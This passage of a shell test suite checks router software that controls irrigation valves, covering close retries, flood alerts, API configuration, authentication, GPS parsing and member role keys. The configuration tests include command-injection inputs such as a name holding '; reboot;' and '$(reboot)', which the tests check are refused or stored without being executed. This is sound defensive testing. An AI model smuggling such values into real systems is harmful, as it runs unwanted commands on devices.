    LT_CLOSE_RETRY_AT="0 0 0 0"; LT_CLOSE_EVERY=1; LT_CLOSE_CONFIRM_WITHIN=1; LT_CLOSE_GIVE_UP="${1:-1}"; LT_CLOSE_ALERT_AT="${2:-0}"
    lt_drive_closes )
}
claim() {  # a close of cause $1, exactly as the receiver / the door / the cutoff claim one
  ( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; CONF="$T/conf"; . "$T/conf"; PATH="$T/bin:$PATH"
    lt_claim_close "$DEV" "$1" && echo send || echo skip )
}
cmd7s() { grep -c '"cmd":7' "$SHIM_LOG"; }

rm -f "$T/lt2/close.$DEV"; : > "$T/spool2"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" normal 86400 10 hub 0 0
tick '{"is_watering":1,"volume":20}'
check "close: the cutoff's close is CLAIMED and marked, and sent once" "volume_cap volume_cap 1 1" \
  "$(. "$T/lt2/$DEV"; echo "$stop") $(. "$T/lt2/close.$DEV"; echo "$CL_CAUSE $CL_TRIES") $(cmd7s)"
# ⚠️ EXPLICIT GIVE-UP WINDOWS, NOT SLEEPS. `drive 30` cannot give up (so it must re-issue) and
# `drive 0` must (the window has passed) — a wall-clock `sleep 1` against a one-second window made
# which branch ran depend on where the second boundary fell, and the suite flaked on exactly that.
drive 30; drive 30
check "close: an accepted command over an open valve is RE-ISSUED, not believed" "yes" \
  "$([ "$(cmd7s)" -ge 2 ] && echo yes || echo no)"
drive 0
check "close: the hub gives up rather than retrying forever" "no" \
  "$([ -f "$T/lt2/close.$DEV" ] && echo yes || echo no)"
check "close: exactly one alert, naming the cause" "1" \
  "$(grep -c "$LT_CLOSE_UNCONFIRMED_EVENT.*cause=volume_cap" "$T/spool2")"
# ⚠️ ASSERT THE RELATIONSHIP, NOT A NUMBER. `attempts` is what the hub had put on the wire WHEN IT
# SPOKE — which since the split is no longer the final total, because it kept trying afterwards. These
# were equal before, and asserting equality again is exactly how a silent revert to one window passes.
check "close: the alert counts the attempts made when he was told, and the hub tried on" "yes" \
  "$([ "$(grep -o 'attempts=[0-9]*' "$T/spool2" | cut -d= -f2)" -le "$(cmd7s)" ] && echo yes || echo no)"
check "close: giving up re-arms the software cutoff on a CAPPED run (it is the only one there is)" "" \
  "$(. "$T/lt2/$DEV"; echo "$stop")"
_n=$(cmd7s); drive 30; drive 0
check "close: and nothing more is sent once it has given up" "$_n" "$(cmd7s)"
check "close: nor a second alert" "1" "$(grep -c "$LT_CLOSE_UNCONFIRMED_EVENT" "$T/spool2")"

# The healthy case must stay silent: one command, the valve reports shut, nothing else.
rm -f "$T/lt2/close.$DEV"; : > "$T/spool2"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" normal 86400 10 hub 0 0
tick '{"is_watering":1,"volume":20}'
printf '{"is_watering":0,"volume":20}' > "$SHIM_CMD3"; : > "$SHIM_LOG"
drive 30
check "close: a valve that reports SHUT confirms, and no retry is sent" "no 0" \
  "$([ -f "$T/lt2/close.$DEV" ] && echo yes || echo no) $(cmd7s)"
check "close: …and nobody is woken" "0" "$(grep -c "$LT_CLOSE_UNCONFIRMED_EVENT" "$T/spool2")"

# A valve that shuts MID-RETRY stops the sequence where it is.
rm -f "$T/lt2/close.$DEV"; : > "$T/spool2"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" normal 86400 10 hub 0 0
printf '{"is_watering":1,"volume":20}' > "$SHIM_CMD3"
tick '{"is_watering":1,"volume":20}'
# ⚠️ ALERT POINT AT 30 s, DELIBERATELY OUT OF REACH. This case is "the valve shut before we ever
# had to speak", so the sequence must end on the CONFIRMATION. Left at the default 0 it would alert on
# the first pass and then close — true to production, but a different scenario from the one named here.
drive 30 30
_mid=$(cmd7s)
printf '{"is_watering":0,"volume":20}' > "$SHIM_CMD3"
drive 30 30; drive 0 30
check "close: a valve that shuts mid-retry ends the sequence there" "no $_mid" \
  "$([ -f "$T/lt2/close.$DEV" ] && echo yes || echo no) $(cmd7s)"
check "close: …with no alert, because it closed" "0" "$(grep -c "$LT_CLOSE_UNCONFIRMED_EVENT" "$T/spool2")"
# …and no "Valve closed" either: that notice exists only to CORRECT an alert, and none was sent.
check "close: …and no late \"Valve closed\", because there was nothing to correct" "0" \
  "$(grep -c "$LT_CLOSE_LATE_EVENT" "$T/spool2")"

# 🔴 THE VALVE SHUT AFTER HE WAS TOLD IT HAD NOT — the owner's 2026-09-25 "Yes: 'Valve closed'".
# The gate is CL_ALERTED: this fires only when the failure notice actually went out. Without that gate
# it would fire on every healthy close in the fleet, which is why the case above is asserted too.
rm -f "$T/lt2/close.$DEV"; : > "$T/spool2"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" normal 86400 10 hub 0 0
printf '{"is_watering":1,"volume":20}' > "$SHIM_CMD3"
tick '{"is_watering":1,"volume":20}'
drive 30            # alert-at defaults to 0, so the owner is told on this pass
check "late: the failure notice went out first" "1" "$(grep -c "$LT_CLOSE_UNCONFIRMED_EVENT" "$T/spool2")"
check "late: and the record remembers we spoke" "1" "$(. "$T/lt2/close.$DEV"; echo "${CL_ALERTED:-0}")"
printf '{"is_watering":0,"volume":20}' > "$SHIM_CMD3"
drive 30
check "late: the valve shutting afterwards sends \"Valve closed\"" "1" \
  "$(grep -c "$LT_CLOSE_LATE_EVENT" "$T/spool2")"
check "late: it names the cause, like the failure it corrects" "1" \
  "$(grep -c "$LT_CLOSE_LATE_EVENT.*cause=volume_cap" "$T/spool2")"
check "late: and the sequence is over" "no" "$([ -f "$T/lt2/close.$DEV" ] && echo yes || echo no)"
# Exactly once — a second pass has no record left to act on.
drive 30
check "late: not sent twice" "1" "$(grep -c "$LT_CLOSE_LATE_EVENT" "$T/spool2")"

# ⚠️ THE GUARD IS THE SLOT, NOT THE CALLER'S MANNERS — and the ONE exception is a flood.
rm -f "$T/lt2/close.$DEV"; : > "$T/spool2"
printf '{"is_watering":1,"volume":20}' > "$SHIM_CMD3"
check "close: the first claim sends, a second for the same valve does not" "send skip skip" \
  "$(claim manual) $(claim manual) $(claim volume_cap)"
check "close: the slot still belongs to the press that took it" "manual" "$(. "$T/lt2/close.$DEV"; echo "$CL_CAUSE")"
check "close: a FLOOD takes it over, and restarts the sequence as a flood" "send flood 1" \
  "$(claim flood) $(. "$T/lt2/close.$DEV"; echo "$CL_CAUSE $CL_TRIES")"
check "close: and a flood does not override a flood" "skip" "$(claim flood)"

# The alert for a MANUAL close carries cause=manual — same event, same severity, different cause.
rm -f "$T/lt2/close.$DEV"; : > "$T/spool2"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" normal 86400 10 hub 0 0
check "close: a manual claim marks the run manual" "send manual" "$(claim manual) $(. "$T/lt2/$DEV"; echo "$stop")"
drive 0
check "close: an unconfirmed manual close alerts too, saying which" "1" \
  "$(grep -c "$LT_CLOSE_UNCONFIRMED_EVENT.*cause=manual" "$T/spool2")"

# 🔴 A WASHDOWN KEEPS ITS MARK ON GIVE-UP. It has no cap, so releasing buys no cutoff — and it is the
# one mode a handover can reopen, which would reprogram a valve the hub just failed to shut.
rm -f "$T/lt2/close.$DEV"; : > "$T/spool2"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 285 )) "" washdown 300 0 hub 1 0
check "close: the flood claim marks the washdown" "send flood_shutoff" "$(claim flood) $(. "$T/lt2/$DEV"; echo "$stop")"
drive 0
check "close: a washdown that could not be closed KEEPS the mark that forbids its handover" "flood_shutoff" \
  "$(. "$T/lt2/$DEV"; echo "$stop")"
tick '{"is_watering":1,"volume":8,"remain_duration":15}'
check "close: …so it is never handed over into a fresh run" "0" "$(grep -c '"cmd":6' "$SHIM_LOG")"

# 🔴 THE UPGRADE-ERA FILE IS WHY THE MODE IS ASKED ON ITS OWN. A state file written before 0.15 carries
# no `cap=` line and MEANS "the profile's Normal Run", so a washdown in one resolves to the profile's
# 378 L — the cap test cannot catch it, and only the mode test keeps the handover forbidden.
rm -f "$T/lt2/close.$DEV"; : > "$T/spool2"
printf 'state=watering
started=%s
stop=
mode=washdown
prov=hub
resume=1
handover=0
' "$(( $(date +%s) - 285 ))" > "$T/lt2/$DEV"
check "close: an upgrade-era washdown file resolves to the profile cap" "washdown 378"   "$(lt_profile "$DEV"; lt_load_state "$T/lt2/$DEV" "$_p_dur" 378; echo "$_mode $_cap_eff")"
claim flood >/dev/null
check "close: marking it does NOT erase that cap (the mark rewrites the whole run)" "washdown 378" \
  "$(. "$T/lt2/$DEV"; echo "$mode $cap")"
drive 0
check "close: …and it STILL keeps the mark that forbids its handover" "flood_shutoff"   "$(. "$T/lt2/$DEV"; echo "$stop")"

# The WIRING: linktap_tick itself drives the confirm, so a close claimed by the receiver CGI or the LAN
# door (different processes, same close.<dev> record) is answered by the poll loop.
rm -f "$T/lt2/close.$DEV" "$T/lt2/$DEV"; : > "$T/spool2"
check "close: a close claimed by another process is recorded" "send yes" \
  "$(claim flood) $([ -f "$T/lt2/close.$DEV" ] && echo yes || echo no)"
tick '{"is_watering":0,"volume":1}'
check "close: and the very next tick confirms it against the valve" "no" \
  "$([ -f "$T/lt2/close.$DEV" ] && echo yes || echo no)"
printf '{"is_watering":1,"volume":3.2,"remain_duration":212}' > "$SHIM_CMD3"

# The gateway push route: rings the loop for a watched valve, from the gateway's address only.
rm -f "$T/lt/wake"
r=$(api POST /linktap/push "{\"dev_stat\":[{\"dev_id\":\"$DEV\",\"is_watering\":1}]}" REMOTE_ADDR=192.168.8.50 HTTP_AUTHORIZATION="")
check "push route: answers ok with no key (the gateway has none)" "200" "$(status_of "$r")"
check "push route: a push naming a watched valve rings the poll loop" "yes" "$([ -f "$T/lt/wake" ] && echo yes || echo no)"
rm -f "$T/lt/wake"
r=$(api POST /linktap/push "{\"dev_id\":\"$DEV\"}" REMOTE_ADDR=192.168.8.99 HTTP_AUTHORIZATION="")
check "push route: from anywhere else it is the same 'ok' and does nothing" "200 no" "$(status_of "$r") $([ -f "$T/lt/wake" ] && echo yes || echo no)"

echo ""
echo "# --- slice 3: the rest of the daemon's hub contract ----------------------------------------"
cp "$T/conf" "$T/conf.orig"
r=$(api POST /config '{"name":"Aft router","heartbeatSecs":900,"shellySecret":"s3cr3t-Value_1","unknownKey":1}')
check "config: accepted" "200" "$(status_of "$r")"
check "config: answers with the new status" "1" "$(body_of "$r" | grep -c '"name":"Aft router","enabled":true,"heartbeatSecs":900')"
check "config: shellySecret arms the ingest, and is never echoed" "1 0" "$(body_of "$r" | grep -c '"shellyIngestArmed":true') $(body_of "$r" | grep -c 's3cr3t')"
check "config: unknown conf keys survive the rewrite" "1" "$(grep -c '^LINKTAP_NORMAL_VOL_L=378' "$T/conf")"
check "config: the rewritten conf is chmod 600" "600" "$(ls -l "$T/conf" | cut -c2-10 | sed 's/rw-------/600/')"
check "config: asks the collector to reload" "yes" "$([ -f "$T/reload" ] && echo yes || echo no)"
r=$(api POST /config '{"heartbeatSecs":30}')
check "config: heartbeat below the 60 s floor is 422" "422" "$(status_of "$r")"
r=$(api POST /config '{"enabled":false}')
check "config: 'enabled' is refused — it would stop the service serving this door" "422" "$(status_of "$r")"
r=$(api POST /config '{"name":"x\"; reboot; \""}')
check "config: a name that is not plain text is refused" "422" "$(status_of "$r")"
r=$(api POST /config '{"name":"$(reboot)"}')
. "$T/conf"
check "config: shell metacharacters are STORED, never executed, when the conf is sourced" '$(reboot)' "$HUB_NAME"
r=$(api POST /config '{"gps":{"kind":"cradlepoint","host":"192.168.0.1","username":"admin","password":"p@ss w0rd"}}')
check "config: a daemon-shaped cradlepoint gps source" "200" "$(status_of "$r")"
check "config: gps reported redacted, with 443 as the default port" "1 0" \
  "$(body_of "$r" | grep -c '"gps":{"kind":"cradlepoint","host":"192.168.0.1","port":443,"protocol":"tcp","username":"admin","devId":"","enabled":true,"hasPassword":true}') $(body_of "$r" | grep -c 'p@ss')"
r=$(api POST /gps '{"kind":"nmea","host":"192.168.8.30","port":10110,"protocol":"udp"}')
check "gps: UDP NMEA is refused honestly" "422" "$(status_of "$r")"
r=$(api POST /gps '{"kind":"nmea","host":"192.168.8.30","port":2000}')
check "gps: TCP NMEA source set" "1" "$(body_of "$r" | grep -c '"gps":{"kind":"nmea","host":"192.168.8.30","port":2000')"
r=$(api POST /token '{"token":"short"}')
check "token: not a device token is 422" "422" "$(status_of "$r")"
r=$(api POST /token '{"token":"tok_ROTATED_0123456789"}')
check "token: rotated" "200 1" "$(status_of "$r") $(grep -c '^DEVICE_TOKEN="tok_ROTATED_0123456789"' "$T/conf")"
r=$(api GET /logs "")
check "logs: tails the hub-lite's own lines only" "3" "$(body_of "$r" | sed 's/\\n/\n/g' | grep -c 'brvg-hub-lite')"
check "logs: the management key and any t= value are redacted" "0 0" \
  "$(body_of "$r" | grep -c "$KEY") $(body_of "$r" | grep -c 'tok_SECRET')"
r=$(PATH="$T/bin:/usr/bin:/bin" api POST /update "")
check "update: 501 where there is no opkg (a Pi, a test box)" "501" "$(status_of "$r")"

r=$(api GET /identity "" REMOTE_ADDR=127.0.0.1)
check "identity: a claimed router refuses setup forever" "409" "$(status_of "$r")"
cat > "$T/conf" <<'CONF'
WORKER_URL="https://api.example.test"
CONF
r=$(api GET /identity "" REMOTE_ADDR=10.9.9.9 HTTP_AUTHORIZATION="")
check "identity: off the router's /24 is refused" "403" "$(status_of "$r")"
r=$(api GET /ping "" HTTP_AUTHORIZATION="")
check "ping: an unclaimed router inside its window is adoptable" "1" "$(body_of "$r" | grep -c '"adoptable":true')"
r=$(api GET /identity "" REMOTE_ADDR=192.168.8.20 HTTP_AUTHORIZATION="")
check "identity: mints a brv_net_ id from the same /24, inside the window" "200 1" "$(status_of "$r") $(body_of "$r" | grep -c '"hubId":"brv_net_[0-9a-f]\{12\}"')"
echo $(( $(date +%s) - 901 )) > "$T/started"
r=$(api POST /bootstrap '{"vid":"v_new","token":"tok_NEW_0123456789ab"}' REMOTE_ADDR=192.168.8.20 HTTP_AUTHORIZATION="")
check "bootstrap: the window closes 15 minutes after service start" "403" "$(status_of "$r")"
r=$(api POST /bootstrap '{"vid":"v_new","name":"Router","token":"tok_NEW_0123456789ab","heartbeatSecs":600}' REMOTE_ADDR=127.0.0.1 HTTP_AUTHORIZATION="")
check "bootstrap: loopback is not time-boxed (daemon adopt.rs)" "200" "$(status_of "$r")"
check "bootstrap: writes the vehicle, the token and the id (double-quoted, as postinst greps)" "3" \
  "$(grep -cE '^(VID="v_new"|DEVICE_TOKEN="tok_NEW_0123456789ab"|DEVICE_ID="brv_net_[0-9a-f]+")$' "$T/conf")"
r=$(api POST /bootstrap '{"vid":"v_other","token":"tok_OTHER_0123456789"}' REMOTE_ADDR=127.0.0.1 HTTP_AUTHORIZATION="")
check "bootstrap: and then the door is shut" "409" "$(status_of "$r")"
date +%s > "$T/started"
cp "$T/conf.orig" "$T/conf"

r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=x")
check "shelly: DENY WHEN UNSET, like the daemon" "401" "$(status_of "$r")"
echo 'SHELLY_SECRET="s3cr3t"' >> "$T/conf"
r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=nope" HTTP_AUTHORIZATION="")
check "shelly: a wrong k is 401" "401" "$(status_of "$r")"
r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=s3cr3t&vid=v_else" HTTP_AUTHORIZATION="")
check "shelly: another vehicle's report is 404" "404" "$(status_of "$r")"
r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=s3cr3t" REMOTE_ADDR=8.8.8.8 HTTP_AUTHORIZATION="")
check "shelly: a caller off any plausible vessel network is 403" "403" "$(status_of "$r")"
: > "$T/spool"; : > "$SHIM_LOG"; echo 7 > "$SHIM_RC"
r=$(api GET /shelly "" QUERY_STRING="device=s1&event=flood.alarm&k=s3cr3t&vid=v_test&ts=1" HTTP_AUTHORIZATION="" REMOTE_ADDR=100.70.1.2)
echo 0 > "$SHIM_RC"
check "shelly: CGNAT (Starlink/cellular LANs) is plausible, and the report is accepted" "200" "$(status_of "$r")"
check "shelly: the flood close ran through the receiver" "1" "$(grep -c '"cmd":7' "$SHIM_LOG")"
check "shelly: the undelivered alarm is spooled WITHOUT the secret" "1 0" "$(grep -c 'flood.alarm' "$T/spool") $(grep -c 's3cr3t' "$T/spool")"

echo ""
echo "# --- slice 3: GPS, updates, conf, loop ----------------------------------------------------"
check "nmea: a torn sentence that fails its checksum is rejected" "" \
  "$(printf '$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*61\n' | parse_nmea_rmc)"
check "nmea: a sentence with no checksum is accepted (forwarders strip it)" "41.40846 -81.74975" \
  "$(printf '$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A\n' | parse_nmea_rmc)"
check "nmea: GGA is the fallback, with HDOP x 5 as accuracy" "48.11730 11.51667 4" \
  "$(printf '$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47\r\n' | parse_nmea_rmc)"
check "nmea: RMC is preferred over GGA" "41.40846 -81.74975" \
  "$(printf '$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47\r\n$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*60\r\n' | parse_nmea_rmc)"
check "nmea: GGA with no fix quality is not a fix" "" \
  "$(printf '$GPGGA,123519,4807.038,N,01131.000,E,0,08,0.9,545.4,M,46.9,M,,\r\n' | parse_nmea_rmc)"
check "cradlepoint: unset port is HTTPS on 443 (daemon default)" "https://192.168.0.1" "$(cradlepoint_base 192.168.0.1 "")"
check "cradlepoint: 443 is https" "https://h" "$(cradlepoint_base h 443)"
check "cradlepoint: 80 is http" "http://h" "$(cradlepoint_base h 80)"
check "cradlepoint: any other port is http with the port" "http://h:8080" "$(cradlepoint_base h 8080)"
( CRADLEPOINT_HOST=192.168.0.1; CRADLEPOINT_PORT=""; curl() { echo "$*" > "$T/cp"; }; read_gps_cradlepoint )
check "cradlepoint: the https poll passes -k (NCOS self-signs on the LAN)" "1" "$(grep -c -- '-k .*https://192.168.0.1/api/status/gps' "$T/cp")"
vn() { if version_newer "$1" "$2"; then echo yes; else echo no; fi; }
check "version: 0.15.1 > 0.15.0" "yes" "$(vn 0.15.1 0.15.0)"
check "version: 0.15.0 is not newer than itself" "no" "$(vn 0.15.0 0.15.0)"
check "version: numeric, not lexical (0.10.0 > 0.9.9)" "yes" "$(vn 0.10.0 0.9.9)"
check "version: older is not newer" "no" "$(vn 0.14.9 0.15.0)"
check "feed: the hub-lite's version out of a Packages index" "0.15.2" \
  "$(printf 'Package: other\nVersion: 9.9\n\nPackage: brvg-hub-lite\nVersion: 0.15.2\nDepends: libc\n' | feed_version)"
check "nap: sleeps until the soonest due work" "7" "$(LT_NAP_SLICE="" next_nap 100 107 200 "")"
check "nap: sliced to 5 s while a valve could be woken" "5" "$(LT_NAP_SLICE=5 next_nap 100 200 300)"
check "nap: overdue work loops straight round (1 s, never 0 or negative)" "1" "$(LT_NAP_SLICE="" next_nap 100 50)"

echo ""
echo "# --- 0.18.1: poll grace (owner ruling 2026-09-17) — the daemon 0.3.52's constants -----------------"
check "grace: the daemon's constants — 45 s continuous, 2 bad samples, retry 5 s first, 60 s cap" "45 2 5 60" \
  "$POLL_GRACE_SECS $POLL_GRACE_MIN_BAD $POLL_RETRY_FIRST_SECS $POLL_RETRY_CAP_SECS"
check "grace: ONE failed poll holds (not down), retries 5 s after the failure, and starts the window at its start" "hold 5 0 1 0" \
  "$(poll_grace "" 0 0 1 600)"
check "grace: the first retry is 5 s after the failure is KNOWN (a 30 s timeout ends at 130), not after its start" "hold 135 100 1 0" \
  "$(poll_grace "" 100 130 1 600)"
# The whole schedule, each sample starting when the previous one asked, every one failing.
_gs=""; _gt=0; _gsched=""
for _gi in 1 2 3 4 5 6 7; do
  # shellcheck disable=SC2046
  set -- $(poll_grace "$_gs" "$_gt" "$_gt" 1 600)
  _gsched="$_gsched $_gt:$1"; _gs="$3 $4 $5"; _gt=$2
done
check "grace: retries 5, 10, 20 s, then CLAMPED to first+45 (not 40), down at 45 s, then the 60 s cap" \
  " 0:hold 5:hold 15:hold 35:hold 45:down 105:still 165:still" "$_gsched"
check "grace: 44 s of continuous failure is still inside the grace" "hold" "$(poll_grace "0 1 0" 44 44 1 600 | cut -d' ' -f1)"
check "grace: 45 s of continuous failure (2 samples) is down" "down" "$(poll_grace "0 1 0" 45 45 1 600 | cut -d' ' -f1)"
check "grace: the retry is never later than the healthy cadence (30 s router: 45 + 30, not 45 + 60)" "75" \
  "$(poll_grace "0 4 0" 45 45 1 30 | cut -d' ' -f2)"
check "grace: once down there is no deadline clamp — the backoff continues from the count" "still 105" \
  "$(poll_grace "0 5 1" 45 45 1 600 | cut -d' ' -f1-2)"
check "grace: a good sample inside the grace is a quiet reset to the healthy cadence" "ok 740 0 0 0" "$(poll_grace "100 3 0" 140 141 0 600)"
check "grace: the first good sample after DOWN is up, at once" "up 800 0 0 0" "$(poll_grace "0 9 1" 200 201 0 600)"
check "grace: healthy stays healthy" "ok 700 0 0 0" "$(poll_grace "" 100 100 0 600)"

# The local modem through sample_modem_graced, times injected. A read that answered nothing is "|||".
MG="$T/mgrace"; mkdir -p "$MG"
(
  HUB_LITE_STATE="$MG/state"; MODEM_INTERVAL=600
  log() { echo "$*" >> "$MG/log"; }
  : > "$MG/log"
  good='LTE -69 -102 10 -12|T-Mobile|ok|1048576 1048576'
  snap() { echo "$1 P=$MODEM_P pending=$MODEM_PENDING next=$MODEM_NEXT_AT event=$MODEM_EVENT logs=$(wc -l < "$MG/log" | tr -d ' ')"; }
  sample_modem_graced "$good" 0 8; MODEM_PENDING=0
  snap good > "$MG/out"
  sample_modem_graced '|||' 600 608
  snap fail1 >> "$MG/out"
  for t in 613 623 643 644; do sample_modem_graced '|||' "$t" "$t"; done
  snap fail44 >> "$MG/out"
  sample_modem_graced '|||' 645 653
  snap fail45 >> "$MG/out"
  MODEM_PENDING=0; MODEM_EVENT=0
  sample_modem_graced '|||' 713 721
  snap still >> "$MG/out"
  sample_modem_graced "$good" 781 789
  snap up >> "$MG/out"
  MODEM_EVENT=0; sample_modem_graced "$good" 1381 1389
  snap next-good >> "$MG/out"
  grep -c 'reachable again' "$MG/log" >> "$MG/out"
  # Never a good read since start: the pre-0.18.1 report of an empty read (up=1, no fields) at down.
  MODEM_GRACE=""; MODEM_GOOD_P=""; MODEM_P=""; MODEM_PENDING=0
  sample_modem_graced '|||' 0 8; snap never-hold >> "$MG/out"
  # (set +u: the collector runs without -u, and an empty read's `set -- $_sig` leaves $1 unset.)
  set +u; sample_modem_graced '|||' 45 53; set -u; snap never-down >> "$MG/out"
)
MGP='up=1&mode=LTE&rssi=-69&rsrp=-102&sinr=10&rsrq=-12&carrier=T-Mobile&sim=ok&dataMb=2'
check "modem grace: a good read is reported and becomes the last good" "good P=$MGP pending=0 next=600 event=0 logs=0" "$(sed -n 1p "$MG/out")"
check "modem grace: ONE failed read keeps the last good reading, reports nothing new, retries in 5 s, logs nothing" \
  "fail1 P=$MGP pending=0 next=613 event=0 logs=0" "$(sed -n 2p "$MG/out")"
check "modem grace: failing for 44 s is not down — last good kept, retry clamped to first+45 = 645" \
  "fail44 P=$MGP pending=0 next=645 event=0 logs=0" "$(sed -n 3p "$MG/out")"
check "modem grace: 45 s continuous is down — the last good reading with up=0, pending, a check-in asked for, ONE log line" \
  "fail45 P=up=0${MGP#up=1} pending=1 next=713 event=1 logs=1" "$(sed -n 4p "$MG/out")"
check "modem grace: still failing after down repeats nothing and logs nothing" \
  "still P=up=0${MGP#up=1} pending=0 next=781 event=0 logs=1" "$(sed -n 5p "$MG/out")"
check "modem grace: the first good read is up AT ONCE — pending, a check-in asked for, normal cadence" \
  "up P=$MGP pending=1 next=1381 event=1 logs=2" "$(sed -n 6p "$MG/out")"
check "modem grace: the next good read is ordinary (no event, no log)" "next-good P=$MGP pending=1 next=1981 event=0 logs=2" "$(sed -n 7p "$MG/out")"
check "modem grace: 'reachable again' is logged once, and only because down had been reported" "1" "$(sed -n 8p "$MG/out")"
check "modem grace: no good read since start — nothing reported inside the grace" "never-hold P= pending=0 next=13 event=0 logs=2" "$(sed -n 9p "$MG/out")"
check "modem grace: no good read since start — at down, the pre-0.18.1 empty report (up=1, no fields)" \
  "never-down P=up=1 pending=1 next=63 event=1 logs=3" "$(sed -n 10p "$MG/out")"
( CONF="$T/si.conf"; printf 'KEEP=1\nGPS_INTERVAL=120\n' > "$CONF"; set_intervals 300 600 >/dev/null 2>&1 )
check "set_intervals: writes \$CONF (not a hard-coded /etc path) and keeps other keys" "KEEP=1 GPS_INTERVAL=\"300\" MODEM_INTERVAL=\"600\"" "$(tr '\n' ' ' < "$T/si.conf" | sed 's/ $//')"


echo ""
echo "# --- 0.15.1: per-member role keys (D3) ---------------------------------------------------"
# Real-shaped per-user keys (64 hex, as the worker's generateHubKey mints) and the worker's answer:
# digest + live role, sorted, with a signature over exactly the lines a router stores.
K_OWN=1111111111111111111111111111111111111111111111111111111111111111
K_CTL=2222222222222222222222222222222222222222222222222222222222222222
K_MON=3333333333333333333333333333333333333333333333333333333333333333
K_CTL2=4444444444444444444444444444444444444444444444444444444444444444
# 🔴 THERE WAS NO ADMIN KEY IN THIS SUITE, and that is why tightening the settings bar on 2026-09-25
# broke NOTHING. Every role test here used owner, control or monitor, so "a Limited Admin may change
# settings" — true for the whole life of the `configure` level — was never once asserted, and its
# removal could not be observed. A permissions change that breaks no test is not a safe change; it is
# an untested one.
K_ADM=5555555555555555555555555555555555555555555555555555555555555555
dg() { printf '%s' "$1" | sha256sum | cut -c1-64; }
# $@ = "key role" pairs → the worker's JSON for that set.
member_json() {
  _ml=$(for _pair in "$@"; do set -- $_pair; printf '%s %s\n' "$(dg "$1")" "$2"; done | sort)
  _msig=$(printf '%s\n' "$_ml" | sha256sum | cut -c1-64)
  [ -z "$_ml" ] && _msig=$(printf '' | sha256sum | cut -c1-64)
  _mk=$(printf '%s\n' "$_ml" | awk 'NF == 2 { printf "%s{\"h\":\"%s\",\"role\":\"%s\"}", (n++ ? "," : ""), $1, $2 }')
  printf '{"status":"ok","sig":"%s","keys":[%s]}' "$_msig" "$_mk"
}
# One collector sync against a stubbed worker. MK_CODE / MK_BODY are the answer; the curl args are logged.
sync_keys() {
  (
    MEMBER_KEYS_FILE="$T/keys"; VID=v_test; DEVICE_ID=brv_net_test; DEVICE_TOKEN=tok_SECRET_0123456789
    WORKER_URL=https://api.example.test
    curl() { _o=""; _p=""; for _a in "$@"; do [ "$_p" = "-o" ] && _o="$_a"; _p="$_a"; done
             printf '%s\n' "$*" >> "$T/mk.log"; printf '%s' "$MK_BODY" > "$_o"; printf '%s' "$MK_CODE"; }
    fetch_member_keys 2>/dev/null
  )
}
SET1=$(member_json "$K_OWN owner" "$K_CTL control" "$K_MON monitor" "$K_ADM admin")
: > "$T/mk.log"; rm -f "$T/keys"
MK_CODE=200 MK_BODY="$SET1" sync_keys; _rc=$?
check "keys: the first sync stores the set" "0" "$_rc"
check "keys: as a signature line plus one digest+role per member" "5" "$(wc -l < "$T/keys" | tr -cd '0-9')"
check "keys: the file holds DIGESTS, never a key" "0" "$(grep -c "$K_CTL" "$T/keys")"
check "keys: the control member's digest carries the control role" "1" "$(grep -c "^$(dg "$K_CTL") control$" "$T/keys")"
check "keys: root-only (0600), not the conf's audience" "-rw-------" "$(ls -l "$T/keys" | cut -c1-10)"
check "keys: asked with the router's own device token on the member-keys route" "1" "$(grep -c 'api/hub-lite/member-keys?vid=v_test&device=brv_net_test&t=tok_SECRET' "$T/mk.log")"
check "keys: the first ask has no If-None-Match" "0" "$(grep -c 'If-None-Match' "$T/mk.log")"
cp "$T/keys" "$T/keys.before"; : > "$T/mk.log"
MK_CODE=304 MK_BODY="" sync_keys
check "keys: the next poll presents the stored signature" "1" "$(grep -c "If-None-Match: \"$(sed -n 's/^sig //p' "$T/keys")\"" "$T/mk.log")"
check "keys: a 304 leaves the set untouched (no flash write)" "same" "$(cmp -s "$T/keys" "$T/keys.before" && echo same || echo changed)"
MK_CODE=200 MK_BODY=$(printf '%s' "$SET1" | sed 's/"sig":"./"sig":"0/') sync_keys; _rc=$?
check "keys: a set that does not hash to its signature is refused and the old set kept" "1 same" "$_rc $(cmp -s "$T/keys" "$T/keys.before" && echo same || echo changed)"
MK_CODE=200 MK_BODY=$(printf '%s' "$SET1" | sed 's/,"keys":.*$/,"keys":[{"h":"/') sync_keys
check "keys: a truncated answer is refused and the old set kept" "same" "$(cmp -s "$T/keys" "$T/keys.before" && echo same || echo changed)"
MK_CODE=401 MK_BODY='{"status":"unauthorized"}' sync_keys
check "keys: a refused sync keeps the cached set (offline crew still get in, as on the daemon)" "same" "$(cmp -s "$T/keys" "$T/keys.before" && echo same || echo changed)"
check "keys: parser keeps monitor_quiet and drops an unknown role" "$(dg "$K_MON") monitor_quiet" \
  "$(printf '{"sig":"x","keys":[{"h":"%s","role":"monitor_quiet"},{"h":"%s","role":"root"}]}' "$(dg "$K_MON")" "$(dg "$K_CTL")" | parse_member_keys)"

# The door. A router with NO MGMT_KEY at all proves the member set stands on its own.
sed '/^MGMT_KEY=/d' "$T/conf" > "$T/conf.members"
mapi() { _mk_key="$1"; shift; api "$@" HTTP_AUTHORIZATION="Bearer $_mk_key" BRVG_HUB_LITE_CONF="$T/conf.members"; }
rm -f "$T/lt/$DEV" "$T/keys-stale"
r=$(mapi "$K_MON" GET /status "")
check "role: a MONITOR key may read status" "200" "$(status_of "$r")"
